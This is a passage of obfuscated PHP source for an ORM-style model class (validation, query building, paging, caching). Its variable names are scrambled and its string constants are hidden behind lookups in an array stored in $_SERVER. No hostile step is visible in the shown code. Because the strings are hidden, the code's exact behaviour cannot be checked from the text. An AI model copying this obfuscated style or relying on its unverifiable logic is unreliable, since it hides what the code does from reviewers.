$ÄÍ®†[10] . $áµ¡Ûà) === $…›İ²ÍØ) { Session::remove($º²ë½Ä . $ÄÍ®†[10] . $áµ¡Ûà); return !0; } if (think_config($ÄÍ®†[331])) { Session::remove($º²ë½Ä . $ÄÍ®†[10] . $áµ¡Ûà); } return !1; } return !0; } public function regex($êÉ¡ÒÜŒ, $Æ±Å“) { $©úô®ª÷ =& $_SERVER[…É¦À–]; $ıÇ™Åª¾ = array($©úô®ª÷[332] => $©úô®ª÷[333], $©úô®ª÷[334] => $©úô®ª÷[335], $©úô®ª÷[336] => $©úô®ª÷[337], $©úô®ª÷[338] => $©úô®ª÷[339], $©úô®ª÷[340] => $©úô®ª÷[341], $©úô®ª÷[342] => $©úô®ª÷[343], $©úô®ª÷[344] => $©úô®ª÷[345], $©úô®ª÷[319] => $©úô®ª÷[346], $©úô®ª÷[347] => $©úô®ª÷[348]); if (isset($ıÇ™Åª¾[strtolower($Æ±Å“)])) { $Æ±Å“ = $ıÇ™Åª¾[strtolower($Æ±Å“)]; } return preg_match($Æ±Å“, $êÉ¡ÒÜŒ) === 1; } private function autoOperation(&$ø¹—‹ãÔ, $—Ï÷ÍëÁ) { $Š›ûô¿Ç =& $_SERVER[…É¦À–]; if (!empty($this->options[$Š›ûô¿Ç[349]])) { $ÁìúŸƒ÷ = $this->options[$Š›ûô¿Ç[349]]; unset($this->options[$Š›ûô¿Ç[349]]); } elseif (!empty($this->_auto)) { $ÁìúŸƒ÷ = $this->_auto; } if (isset($ÁìúŸƒ÷)) { foreach ($ÁìúŸƒ÷ as $³üÉû¢Ÿ) { if (empty($³üÉû¢Ÿ[2])) { $³üÉû¢Ÿ[2] = THINK_MODEL_INSERT; } if ($—Ï÷ÍëÁ == $³üÉû¢Ÿ[2] || $³üÉû¢Ÿ[2] == THINK_MODEL_BOTH) { switch (trim($³üÉû¢Ÿ[3])) { case $Š›ûô¿Ç[350]: case $Š›ûô¿Ç[351]: $îñÔŸâ› = isset($³üÉû¢Ÿ[4]) ? (array) $³üÉû¢Ÿ[4] : array(); if (isset($ø¹—‹ãÔ[$³üÉû¢Ÿ[0]])) { array_unshift($îñÔŸâ›, $ø¹—‹ãÔ[$³üÉû¢Ÿ[0]]); } if ($Š›ûô¿Ç[350] == $³üÉû¢Ÿ[3]) { $ø¹—‹ãÔ[$³üÉû¢Ÿ[0]] = call_user_func_array($³üÉû¢Ÿ[1], $îñÔŸâ›); } else { $ø¹—‹ãÔ[$³üÉû¢Ÿ[0]] = call_user_func_array(array(&$this, $³üÉû¢Ÿ[1]), $îñÔŸâ›); } break; case $Š›ûô¿Ç[302]: $ø¹—‹ãÔ[$³üÉû¢Ÿ[0]] = $ø¹—‹ãÔ[$³üÉû¢Ÿ[1]]; break; case $Š›ûô¿Ç[352]: if ($Š›ûô¿Ç[12] === $ø¹—‹ãÔ[$³üÉû¢Ÿ[0]]) { unset($ø¹—‹ãÔ[$³üÉû¢Ÿ[0]]); } break; case $Š›ûô¿Ç[353]: default: $ø¹—‹ãÔ[$³üÉû¢Ÿ[0]] = $³üÉû¢Ÿ[1]; } if (!1 === $ø¹—‹ãÔ[$³üÉû¢Ÿ[0]]) { unset($ø¹—‹ãÔ[$³üÉû¢Ÿ[0]]); } } } } return $ø¹—‹ãÔ; } protected function autoValidation($Õ—»¦‘Û, $¶İ÷¼ñû) { $ÄÜ„´¶Û =& $_SERVER[…É¦À–]; if (!empty($this->options[$ÄÜ„´¶Û[354]])) { $Õİ“ÓÊ® = $this->options[$ÄÜ„´¶Û[354]]; unset($this->options[$ÄÜ„´¶Û[354]]); } elseif (!empty($this->_validate)) { $Õİ“ÓÊ® = $this->_validate; } if (isset($Õİ“ÓÊ®)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Õİ“ÓÊ® as $•”¨¾É¹ => $Òßç¥Çâ) { if (empty($Òßç¥Çâ[5]) || $Òßç¥Çâ[5] == THINK_MODEL_BOTH || $Òßç¥Çâ[5] == $¶İ÷¼ñû) { if (0 == strpos($Òßç¥Çâ[2], $ÄÜ„´¶Û[355]) && strpos($Òßç¥Çâ[2], $ÄÜ„´¶Û[356])) { $Òßç¥Çâ[2] = think_lang(substr($Òßç¥Çâ[2], 2, -1)); } $Òßç¥Çâ[3] = isset($Òßç¥Çâ[3]) ? $Òßç¥Çâ[3] : THINK_EXISTS_VALIDATE; $Òßç¥Çâ[4] = isset($Òßç¥Çâ[4]) ? $Òßç¥Çâ[4] : $ÄÜ„´¶Û[357]; switch ($Òßç¥Çâ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Õ—»¦‘Û, $Òßç¥Çâ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ÄÜ„´¶Û[12] != trim($Õ—»¦‘Û[$Òßç¥Çâ[0]])) { if (!1 === $this->_validationField($Õ—»¦‘Û, $Òßç¥Çâ)) { return !1; } } break; default: if (isset($Õ—»¦‘Û[$Òßç¥Çâ[0]])) { if (!1 === $this->_validationField($Õ—»¦‘Û, $Òßç¥Çâ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ØŠıÛö—, $¼÷’ƒ¡•) { if (!1 === $this->_validationFieldItem($ØŠıÛö—, $¼÷’ƒ¡•)) { if ($this->patchValidate) { $this->error[$¼÷’ƒ¡•[0]] = $¼÷’ƒ¡•[2]; } else { $this->error = $¼÷’ƒ¡•[2]; return !1; } } return; } protected function _validationFieldItem($áÏâ‰ƒ, $ˆÚÆá¤¾) { $ş“ÏÄğ· =& $_SERVER[…É¦À–]; switch (strtolower(trim($ˆÚÆá¤¾[4]))) { case $ş“ÏÄğ·[350]: case $ş“ÏÄğ·[351]: $Óß×¸œŠ = isset($ˆÚÆá¤¾[6]) ? (array) $ˆÚÆá¤¾[6] : array(); if (is_string($ˆÚÆá¤¾[0]) && strpos($ˆÚÆá¤¾[0], $ş“ÏÄğ·[50])) { $ˆÚÆá¤¾[0] = explode($ş“ÏÄğ·[50], $ˆÚÆá¤¾[0]); } if (is_array($ˆÚÆá¤¾[0])) { foreach ($ˆÚÆá¤¾[0] as $õÂïÎÁ) { $ÛÉï¤¤ò[$õÂïÎÁ] = $áÏâ‰ƒ[$õÂïÎÁ]; } array_unshift($Óß×¸œŠ, $ÛÉï¤¤ò); } else { array_unshift($Óß×¸œŠ, $áÏâ‰ƒ[$ˆÚÆá¤¾[0]]); } if ($ş“ÏÄğ·[350] == $ˆÚÆá¤¾[4]) { return call_user_func_array($ˆÚÆá¤¾[1], $Óß×¸œŠ); } else { return call_user_func_array(array(&$this, $ˆÚÆá¤¾[1]), $Óß×¸œŠ); } case $ş“ÏÄğ·[358]: return $áÏâ‰ƒ[$ˆÚÆá¤¾[0]] == $áÏâ‰ƒ[$ˆÚÆá¤¾[1]]; case $ş“ÏÄğ·[359]: if (is_string($ˆÚÆá¤¾[0]) && strpos($ˆÚÆá¤¾[0], $ş“ÏÄğ·[50])) { $ˆÚÆá¤¾[0] = explode($ş“ÏÄğ·[50], $ˆÚÆá¤¾[0]); } $†ôÏŞÏ = array(); if (is_array($ˆÚÆá¤¾[0])) { foreach ($ˆÚÆá¤¾[0] as $õÂïÎÁ) { $†ôÏŞÏ[$õÂïÎÁ] = $áÏâ‰ƒ[$õÂïÎÁ]; } } else { $†ôÏŞÏ[$ˆÚÆá¤¾[0]] = $áÏâ‰ƒ[$ˆÚÆá¤¾[0]]; } if (!empty($áÏâ‰ƒ[$this->getPk()])) { $†ôÏŞÏ[$this->getPk()] = array($ş“ÏÄğ·[360], $áÏâ‰ƒ[$this->getPk()]); } if ($this->where($†ôÏŞÏ)->find()) { return !1; } return !0; default: return $this->check($áÏâ‰ƒ[$ˆÚÆá¤¾[0]], $ˆÚÆá¤¾[1], $ˆÚÆá¤¾[4]); } } public function check($àµ”¾, $ÔæõÊˆÏ, $­–€Öˆè = "\x72\x65\x67\x65\170") { $ïî­˜ş =& $_SERVER[…É¦À–]; $­–€Öˆè = strtolower(trim($­–€Öˆè)); switch ($­–€Öˆè) { case $ïî­˜ş[7]: case $ïî­˜ş[361]: $¡¦¨Îıê = is_array($ÔæõÊˆÏ) ? $ÔæõÊˆÏ : explode($ïî­˜ş[50], $ÔæõÊˆÏ); return $­–€Öˆè == $ïî­˜ş[7] ? in_array($àµ”¾, $¡¦¨Îıê) : !in_array($àµ”¾, $¡¦¨Îıê); case $ïî­˜ş[362]: case $ïî­˜ş[363]: if (is_array($ÔæõÊˆÏ)) { $ó©¼ú¯Ÿ = $ÔæõÊˆÏ[0]; $ü“®š°¨ = $ÔæõÊˆÏ[1]; } else { list($ó©¼ú¯Ÿ, $ü“®š°¨) = explode($ïî­˜ş[50], $ÔæõÊˆÏ); } return $­–€Öˆè == $ïî­˜ş[362] ? $àµ”¾ >= $ó©¼ú¯Ÿ && $àµ”¾ <= $ü“®š°¨ : $àµ”¾ < $ó©¼ú¯Ÿ || $àµ”¾ > $ü“®š°¨; case $ïî­˜ş[364]: case $ïî­˜ş[365]: return $­–€Öˆè == $ïî­˜ş[364] ? $àµ”¾ == $ÔæõÊˆÏ : $àµ”¾ != $ÔæõÊˆÏ; case $ïî­˜ş[366]: $’™×™éà = mb_strlen($àµ”¾, $ïî­˜ş[367]); if (strpos($ÔæõÊˆÏ, $ïî­˜ş[50])) { list($ó©¼ú¯Ÿ, $ü“®š°¨) = explode($ïî­˜ş[50], $ÔæõÊˆÏ); return $’™×™éà >= $ó©¼ú¯Ÿ && $’™×™éà <= $ü“®š°¨; } else { return $’™×™éà == $ÔæõÊˆÏ; } case $ïî­˜ş[368]: list($ûÉĞŞ, $ÕÊñİŞ) = explode($ïî­˜ş[50], $ÔæõÊˆÏ); if (!is_numeric($ûÉĞŞ)) { $ûÉĞŞ = strtotime($ûÉĞŞ); } if (!is_numeric($ÕÊñİŞ)) { $ÕÊñİŞ = strtotime($ÕÊñİŞ); } return NOW_TIME >= $ûÉĞŞ && NOW_TIME <= $ÕÊñİŞ; case $ïî­˜ş[369]: return in_array(get_client_ip(), explode($ïî­˜ş[50], $ÔæõÊˆÏ)); case $ïî­˜ş[370]: return !in_array(get_client_ip(), explode($ïî­˜ş[50], $ÔæõÊˆÏ)); case $ïî­˜ş[357]: default: return $this->regex($àµ”¾, $ÔæõÊˆÏ); } } public function query($ÎÒ‹¼ªÏ, $«·Üñç° = false) { $ˆØ†£ä =& $_SERVER[…É¦À–]; if (!is_bool($«·Üñç°) && !is_array($«·Üñç°)) { $«·Üñç° = func_get_args(); array_shift($«·Üñç°); } $ÎÒ‹¼ªÏ = str_replace(array($ˆØ†£ä[231], $ˆØ†£ä[371]), $ˆØ†£ä[53], $ÎÒ‹¼ªÏ); $ÎÒ‹¼ªÏ = $this->parseSql($ÎÒ‹¼ªÏ, $«·Üñç°); return $this->db->query($ÎÒ‹¼ªÏ); } public function execute($®ã¿À˜, $Íåüß¾ = false) { if (!is_bool($Íåüß¾) && !is_array($Íåüß¾)) { $Íåüß¾ = func_get_args(); array_shift($Íåüß¾); } $®ã¿À˜ = $this->parseSql($®ã¿À˜, $Íåüß¾); return $this->db->execute($®ã¿À˜); } protected function parseSql($¢øƒ¤é, $ù¹ê³Îå) { $ÜÁ‡œ =& $_SERVER[…É¦À–]; if (!0 === $ù¹ê³Îå) { $ĞôÈÑ¥Œ = $this->_parseOptions(); $¢øƒ¤é = $this->db->parseSql($¢øƒ¤é, $ĞôÈÑ¥Œ); } elseif (is_array($ù¹ê³Îå)) { $ù¹ê³Îå = array_map(array($this->db, $ÜÁ‡œ[372]), $ù¹ê³Îå); $¢øƒ¤é = vsprintf($¢øƒ¤é, $ù¹ê³Îå); } else { $¢øƒ¤é = strtr($¢øƒ¤é, array($ÜÁ‡œ[373] => $this->getTableName(), $ÜÁ‡œ[374] => think_config($ÜÁ‡œ[273]))); } $this->db->setModel($this->name); return $¢øƒ¤é; } public function db($¯¢ãÂÆ¾ = '', $ÓŸ§Â¦´ = '', $‚²•™óê = array()) { $Éò™ƒ =& $_SERVER[…É¦À–]; if ($Éò™ƒ[12] === $¯¢ãÂÆ¾ && $this->db) { return $this->db; } static $ˆ½åù´ = array(); static $ÆŸ…¦Ö  = array(); if (!isset($ÆŸ…¦Ö [$¯¢ãÂÆ¾]) || isset($ÆŸ…¦Ö [$¯¢ãÂÆ¾]) && $ÓŸ§Â¦´ && $ˆ½åù´[$¯¢ãÂÆ¾] != $ÓŸ§Â¦´) { if (!empty($ÓŸ§Â¦´) && is_string($ÓŸ§Â¦´) && !1 === strpos($ÓŸ§Â¦´, $Éò™ƒ[8])) { $ÓŸ§Â¦´ = think_config($ÓŸ§Â¦´); } $¯¢ãÂÆ¾ = think_guid($ÓŸ§Â¦´); $ÆŸ…¦Ö [$¯¢ãÂÆ¾] = Db::getInstance($ÓŸ§Â¦´); } elseif (NULL === $ÓŸ§Â¦´) { $ÆŸ…¦Ö [$¯¢ãÂÆ¾]->close(); unset($ÆŸ…¦Ö [$¯¢ãÂÆ¾]); return; } if (!empty($‚²•™óê)) { if (is_string($‚²•™óê)) { parse_str($‚²•™óê, $‚²•™óê); } foreach ($‚²•™óê as $õ¿°Ïœ => $ˆ¸—Ã‰Æ) { $this->setProperty($õ¿°Ïœ, $ˆ¸—Ã‰Æ); } } $ˆ½åù´[$¯¢ãÂÆ¾] = $ÓŸ§Â¦´; $this->db = $ÆŸ…¦Ö [$¯¢ãÂÆ¾]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $€ÃãšÁû = get_class($this); if ($€ÃãšÁû == $_SERVER[…É¦À–][375]) { return $this->name; } $this->name = substr($€ÃãšÁû, 0, -5); } return $this->name; } public function getTableName() { $‹›Œ¨æ™ =& $_SERVER[…É¦À–]; if (empty($this->trueTableName)) { $«Îø¥Ò± = !empty($this->tablePrefix) ? $this->tablePrefix : $‹›Œ¨æ™[12]; if (!empty($this->tableName)) { $«Îø¥Ò± .= $this->tableName; } else { $«Îø¥Ò± .= think_parse_name($this->name); } $this->trueTableName = strtolower($«Îø¥Ò±); } return (!empty($this->dbName) ? $this->dbName . $‹›Œ¨æ™[10] : $‹›Œ¨æ™[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Ë“ø»Ù =& $_SERVER[…É¦À–]; return isset($this->fields[$Ë“ø»Ù[280]]) ? $this->fields[$Ë“ø»Ù[280]] : $this->pk; } public function getDbFields() { $Ö’òîñ» =& $_SERVER[…É¦À–]; if (isset($this->options[$Ö’òîñ»[308]])) { $ï·³ä‹» = $this->db->getFields($this->options[$Ö’òîñ»[308]]); return $ï·³ä‹» ? array_keys($ï·³ä‹») : !1; } if ($this->fields) { $ï·³ä‹» = $this->fields; unset($ï·³ä‹»[$Ö’òîñ»[279]], $ï·³ä‹»[$Ö’òîñ»[280]], $ï·³ä‹»[$Ö’òîñ»[281]], $ï·³ä‹»[$Ö’òîñ»[278]]); return $ï·³ä‹»; } return !1; } public function data($Ñç½íÅ = '') { $Ô±áõ‹ =& $_SERVER[…É¦À–]; if ($Ô±áõ‹[12] === $Ñç½íÅ && !empty($this->data)) { return $this->data; } if (is_object($Ñç½íÅ)) { $Ñç½íÅ = get_object_vars($Ñç½íÅ); } elseif (is_string($Ñç½íÅ)) { parse_str($Ñç½íÅ, $Ñç½íÅ); } elseif (!is_array($Ñç½íÅ)) { think_exception(think_lang($Ô±áõ‹[300])); } $this->data = $Ñç½íÅ; return $this; } public function join($ÖØ™’á¾) { $½è™¼ê† =& $_SERVER[…É¦À–]; if (is_array($ÖØ™’á¾)) { $this->options[$½è™¼ê†[311]] = $ÖØ™’á¾; } elseif (!empty($ÖØ™’á¾)) { $this->options[$½è™¼ê†[311]][] = $ÖØ™’á¾; } return $this; } public function union($ÄüÌı¯¤, $ëÈç®åâ = false) { $Ÿ‘®òÓê =& $_SERVER[…É¦À–]; if (empty($ÄüÌı¯¤)) { return $this; } if ($ëÈç®åâ) { $this->options[$Ÿ‘®òÓê[376]][$Ÿ‘®òÓê[377]] = !0; } if (is_object($ÄüÌı¯¤)) { $ÄüÌı¯¤ = get_object_vars($ÄüÌı¯¤); } if (is_string($ÄüÌı¯¤)) { $ÉÂ„Ş–Ú = $ÄüÌı¯¤; } elseif (is_array($ÄüÌı¯¤)) { if (isset($ÄüÌı¯¤[0])) { $this->options[$Ÿ‘®òÓê[376]] = array_merge($this->options[$Ÿ‘®òÓê[376]], $ÄüÌı¯¤); return $this; } else { $ÉÂ„Ş–Ú = $ÄüÌı¯¤; } } else { think_exception(think_lang($Ÿ‘®òÓê[300])); } $this->options[$Ÿ‘®òÓê[376]][] = $ÉÂ„Ş–Ú; return $this; } public function cache($°ª¾¶‹¶ = true, $›Üƒ×¶ = null, $ÎÔµáó“ = '') { $¶ô¤üŸÂ =& $_SERVER[…É¦À–]; if (!1 !== $°ª¾¶‹¶) { $this->options[$¶ô¤üŸÂ[378]] = array($¶ô¤üŸÂ[94] => $°ª¾¶‹¶, $¶ô¤üŸÂ[368] => $›Üƒ×¶, $¶ô¤üŸÂ[33] => $ÎÔµáó“); } return $this; } public function field($âÊÇ˜«¨, $•Ğèò·¹ = false) { $ÃĞ‚Çªœ =& $_SERVER[…É¦À–]; if (!0 === $âÊÇ˜«¨) { $çç§Øú… = $this->getDbFields(); $âÊÇ˜«¨ = $çç§Øú… ? $çç§Øú… : $ÃĞ‚Çªœ[189]; } elseif ($•Ğèò·¹) { if (is_string($âÊÇ˜«¨)) { $âÊÇ˜«¨ = explode($ÃĞ‚Çªœ[50], $âÊÇ˜«¨); } $çç§Øú… = $this->getDbFields(); $âÊÇ˜«¨ = $çç§Øú… ? array_diff($çç§Øú…, $âÊÇ˜«¨) : $âÊÇ˜«¨; } $this->options[$ÃĞ‚Çªœ[302]] = $âÊÇ˜«¨; return $this; } public function scope($ÈÆÒü = '', $ÃŠ–à­¨ = NULL) { $…Ö“İóÆ =& $_SERVER[…É¦À–]; if ($…Ö“İóÆ[12] === $ÈÆÒü) { if (isset($this->_scope[$…Ö“İóÆ[37]])) { $ñ¼Õ„ğ¢ = $this->_scope[$…Ö“İóÆ[37]]; } else { return $this; } } elseif (is_string($ÈÆÒü)) { $öÂ¦¬¶Ó = explode($…Ö“İóÆ[50], $ÈÆÒü); $ñ¼Õ„ğ¢ = array(); foreach ($öÂ¦¬¶Ó as $èó¬÷Ù—) { if (!isset($this->_scope[$èó¬÷Ù—])) { continue; } $ñ¼Õ„ğ¢ = array_merge($ñ¼Õ„ğ¢, $this->_scope[$èó¬÷Ù—]); } if (!empty($ÃŠ–à­¨) && is_array($ÃŠ–à­¨)) { $ñ¼Õ„ğ¢ = array_merge($ñ¼Õ„ğ¢, $ÃŠ–à­¨); } } elseif (is_array($ÈÆÒü)) { $ñ¼Õ„ğ¢ = $ÈÆÒü; } if (is_array($ñ¼Õ„ğ¢) && !empty($ñ¼Õ„ğ¢)) { $this->options = array_merge($this->options, array_change_key_case($ñ¼Õ„ğ¢)); } return $this; } public function where($ñ¯ñ¯ø, $Ó·ı¥Ğü = null) { $¥ˆË¹ =& $_SERVER[…É¦À–]; if (!is_null($Ó·ı¥Ğü) && is_string($ñ¯ñ¯ø)) { if (!is_array($Ó·ı¥Ğü)) { $Ó·ı¥Ğü = func_get_args(); array_shift($Ó·ı¥Ğü); } $Ó·ı¥Ğü = array_map(array($this->db, $¥ˆË¹[372]), $Ó·ı¥Ğü); $ñ¯ñ¯ø = vsprintf($ñ¯ñ¯ø, $Ó·ı¥Ğü); } elseif (is_object($ñ¯ñ¯ø)) { $ñ¯ñ¯ø = get_object_vars($ñ¯ñ¯ø); } elseif (is_array($ñ¯ñ¯ø)) { foreach ($ñ¯ñ¯ø as $ÇŞ‡— => $ßÖ‰éò›) { if ((is_numeric($ÇŞ‡—) || !$ÇŞ‡—) && is_string($ßÖ‰éò›)) { if (strpos($ßÖ‰éò›, $¥ˆË¹[379]) === 0) { continue; } think_trace($¥ˆË¹[380], $¥ˆË¹[12], $¥ˆË¹[49]); die; } } } if (is_string($ñ¯ñ¯ø) && $¥ˆË¹[12] != $ñ¯ñ¯ø) { $Õ×Õ¬ = array(); $Õ×Õ¬[$¥ˆË¹[381]] = $ñ¯ñ¯ø; $ñ¯ñ¯ø = $Õ×Õ¬; } if (isset($this->options[$¥ˆË¹[304]])) { $this->options[$¥ˆË¹[304]] = array_merge($this->options[$¥ˆË¹[304]], $ñ¯ñ¯ø); } else { $this->options[$¥ˆË¹[304]] = $ñ¯ñ¯ø; } return $this; } public function limit($…òŸŒ‘ğ, $÷İ²•ô± = null) { $ˆÓñâèİ =& $_SERVER[…É¦À–]; $this->options[$ˆÓñâèİ[321]] = is_null($÷İ²•ô±) ? $…òŸŒ‘ğ : $…òŸŒ‘ğ . $ˆÓñâèİ[50] . $÷İ²•ô±; return $this; } public function page($»¬ÜÖû, $ş«ÔæşÅ = null) { $ú…è‹ =& $_SERVER[…É¦À–]; $this->options[$ú…è‹[382]] = is_null($ş«ÔæşÅ) ? $»¬ÜÖû : $»¬ÜÖû . $ú…è‹[50] . $ş«ÔæşÅ; return $this; } public function comment($ˆôµšèÛ) { $this->options[$_SERVER[…É¦À–][383]] = $ˆôµšèÛ; return $this; } public function setProperty($ê¬ŞƒÁ, $­â®¢óÌ) { if (property_exists($this, $ê¬ŞƒÁ)) { $this->{$ê¬ŞƒÁ} = $­â®¢óÌ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\151\x66\171\124\x69\x6d\145", "\164\151\155\145", "\x69\156\x73\x65\162\164\54\x75\160\x64\x61\x74\x65", "\x66\165\x6e\143\x74\x69\x6f\x6e"), array("\x63\162\145\141\x74\145\124\x69\155\x65", "\x74\151\x6d\x65", "\x69\x6e\163\x65\162\164", "\x66\x75\156\x63\164\x69\157\x6e")); public function setDataAuto($û“Ô‡) { $this->dataAuto = $û“Ô‡; } public function __construct($¨ÜÉƒ¦© = '', $€¬Ä–Ë» = '', $ä¤á¶Ì = '') { parent::__construct($¨ÜÉƒ¦©, $€¬Ä–Ë», $ä¤á¶Ì); } protected $tableMeta = array(); protected function _beforeInsert(&$€üºİÅ¢, $‚‹´åæ›) { $´Ÿô–‹ƒ =& $_SERVER[…É¦À–]; if (!$this->checkDataAutoHas($´Ÿô–‹ƒ[384])) { return; } $this->dataBeforeFilter($€üºİÅ¢, $´Ÿô–‹ƒ[384]); } protected function _beforeUpdate(&$²Ş‹¸ø, $Ü˜Œöİë) { $è¤¸Å• =& $_SERVER[…É¦À–]; if (!$this->checkDataAutoHas($è¤¸Å•[385])) { return; } $this->dataBeforeFilter($²Ş‹¸ø, $è¤¸Å•[385]); } protected function _afterSelect(&$³†¿’ó´, $·É˜·ãŠ) { if (!is_array($³†¿’ó´)) { return; } if (!$this->checkDataAutoHas($_SERVER[…É¦À–][386])) { return; } foreach ($³†¿’ó´ as &$é÷ÖÖ±ù) { $this->dataAfterFilter($é÷ÖÖ±ù); } unset($é÷ÖÖ±ù); } protected function _afterFind(&$Ï·±ÀÃ, $©Ÿ©ß„¾) { if (!is_array($Ï·±ÀÃ)) { return; } if (!$this->checkDataAutoHas($_SERVER[…É¦À–][386])) { return; } $this->dataAfterFilter($Ï·±ÀÃ); } public static function textEncode($¼ßãÔ¯Ñ) { if (!$¼ßãÔ¯Ñ) { return $¼ßãÔ¯Ñ; } $ßÀø­Â” = json_encode($¼ßãÔ¯Ñ); $ßÀø­Â” = preg_replace_callback($_SERVER[…É¦À–][387], function ($ó‰­·¤¸) { return addslashes($ó‰­·¤¸[0]); }, $ßÀø­Â”); return json_decode($ßÀø­Â”); } public static function textDecode($Ñ¬ö®¸à) { $ú˜ıØÜ¯ =& $_SERVER[…É¦À–]; $êïÈ’ù = json_encode($Ñ¬ö®¸à); $êïÈ’ù = preg_replace_callback($ú˜ıØÜ¯[388], function ($ŞåôÈ÷Å) { return $_SERVER[…É¦À–][97]; }, $êïÈ’ù); return json_decode($êïÈ’ù); } public function setAutoIncrement($ç¹İö‡ş) { $¾×áÕ¨™ = array($this->getPk() => $ç¹İö‡ş); $™Ï‡†ƒ = $this->data($¾×áÕ¨™)->add(); if ($™Ï‡†ƒ) { $this->delete($™Ï‡†ƒ); } } public function getAutoIncrement() { $åä‚õÀ„ = $this->getTableName(); $›¨ß¡äÆ = $this->max($this->getPk()); $ìåíÎ²˜ = $this->query("\163\150\x6f\167\x20\164\x61\x62\154\145\40\x73\x74\x61\164\x75\163\x20\167\150\x65\x72\x65\40\x4e\141\x6d\x65\x3d\47{$åä‚õÀ„}\x27"); $–Äã“ë = $ìåíÎ²˜[0][$_SERVER[…É¦À–][389]]; $éƒÖ½œ = max($›¨ß¡äÆ, $–Äã“ë); return $éƒÖ½œ; } protected function _callBefore($Ï˜óš§, $§œŸÙ¾) { return $this->cacheCallCheck($Ï˜óš§, $§œŸÙ¾, !1); } protected function _callAfter($ÊŞëÔİõ, $ù‚¸‰ÛØ) { return $this->cacheCallCheck($ÊŞëÔİõ, $ù‚¸‰ÛØ, !0); } protected function cacheFunctionAlias($üÏÀÖ‹Ñ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ãº˜ıŠ•, $ëõºÄ÷¿, $âÉÛô–¾ = false) { $Ôó‚†÷ = $this->cacheFunctionAlias($ëõºÄ÷¿); if (!$Ôó‚†÷) { return; } foreach ($Ôó‚†÷ as $î†óãµ’ => $×¼ ±Í) { $‹¶Ú“Ò‡ = $×¼ ±Í[0]; $³îùğµõ = explode($_SERVER[…É¦À–][50], $×¼ ±Í[1]); if ($ãº˜ıŠ• == $î†óãµ’) { return $this->cacheFunctionGet($î†óãµ’, $‹¶Ú“Ò‡); } if ($âÉÛô–¾ && in_array($ãº˜ıŠ•, $³îùğµõ)) { $this->cacheFunctionClear($î†óãµ’, $‹¶Ú“Ò‡); } } } public function cacheFunctionGet($Î„á·Ä¸, $”›¬ÛÂ») { $®è”Ó²¸ = $this->cacheKeyMake($Î„á·Ä¸, $”›¬ÛÂ»); $“¿«£ï¥ = Cache::get($®è”Ó²¸); if (!is_array($“¿«£ï¥)) { $“¿«£ï¥ = call_user_func_array(array($this, $Î„á·Ä¸), array($”›¬ÛÂ», !0)); Cache::set($®è”Ó²¸, $“¿«£ï¥); } return $“¿«£ï¥; } public function cacheFunctionClear($‰¨²„ˆ¢, $‰«ï÷¥Î) { $Ğß¡®˜¹ = $‰«ï÷¥Î; if (!is_array($‰«ï÷¥Î)) { $Ğß¡®˜¹ = array($‰«ï÷¥Î); } foreach ($Ğß¡®˜¹ as $±öò³¾”) { $ô­öØÍ± = $this->cacheKeyMake($‰¨²„ˆ¢, $±öò³¾”); Cache::remove($ô­öØÍ±); } } private function cacheKeyMake($Œ‹»Õ¹ù, $Ÿ³ŞºÊå) { $Ñæò‹Õ =& $_SERVER[…É¦À–]; return get_class($this) . $Ñæò‹Õ[11] . $Œ‹»Õ¹ù . $Ñæò‹Õ[390] . $Ÿ³ŞºÊå; } protected function selectPageReset() { $€—ß–¦³ =& $_SERVER[…É¦À–]; if (isset($GLOBALS[$€—ß–¦³[391]])) { return; } $GLOBALS[$€—ß–¦³[391]] = isset($GLOBALS[$€—ß–¦³[7]][$€—ß–¦³[392]]) ? $GLOBALS[$€—ß–¦³[7]][$€—ß–¦³[392]] : !1; $GLOBALS[$€—ß–¦³[393]] = isset($GLOBALS[$€—ß–¦³[7]][$€—ß–¦³[382]]) ? $GLOBALS[$€—ß–¦³[7]][$€—ß–¦³[382]] : !1; $GLOBALS[$€—ß–¦³[7]][$€—ß–¦³[392]] = !1; $GLOBALS[$€—ß–¦³[7]][$€—ß–¦³[382]] = !1; } protected function selectPageRestore() { $ıë“µ =& $_SERVER[…É¦À–]; if (!isset($GLOBALS[$ıë“µ[391]])) { return; } $GLOBALS[$ıë“µ[7]][$ıë“µ[392]] = $GLOBALS[$ıë“µ[391]]; $GLOBALS[$ıë“µ[7]][$ıë“µ[382]] = $GLOBALS[$ıë“µ[393]]; if ($GLOBALS[$ıë“µ[7]][$ıë“µ[392]] === !1) { unset($GLOBALS[$ıë“µ[7]][$ıë“µ[392]]); } if ($GLOBALS[$ıë“µ[7]][$ıë“µ[382]] === !1) { unset($GLOBALS[$ıë“µ[7]][$ıë“µ[382]]); } unset($GLOBALS[$ıë“µ[391]]); unset($GLOBALS[$ıë“µ[393]]); } protected function selectPage($òÄ®–İ = 200, $ÑÁĞ—¼¥ = 1) { $Çõ»ùÑ =& $_SERVER[…É¦À–]; global $in; $šòùŞ = $this->optionsValue(); $Í¤œ•ú = 50000; $òÄ®–İ = isset($in[$Çõ»ùÑ[392]]) && $in[$Çõ»ùÑ[392]] ? $in[$Çõ»ùÑ[392]] : $òÄ®–İ; if ($òÄ®–İ === -1) { $in[$Çõ»ùÑ[392]] = !1; $Í¤œ•ú = 100000000; $òÄ®–İ = $Í¤œ•ú; } $éâÚÉ¨¨ = $šòùŞ; $éâÚÉ¨¨[$Çõ»ùÑ[394]] = array(); $òÄ®–İ = intval($òÄ®–İ); $òÄ®–İ = $òÄ®–İ <= 5 ? 5 : ($òÄ®–İ >= $Í¤œ•ú ? $Í¤œ•ú : $òÄ®–İ); $ÑÁĞ—¼¥ = intval(isset($in[$Çõ»ùÑ[382]]) && $in[$Çõ»ùÑ[382]] ? $in[$Çõ»ùÑ[382]] : 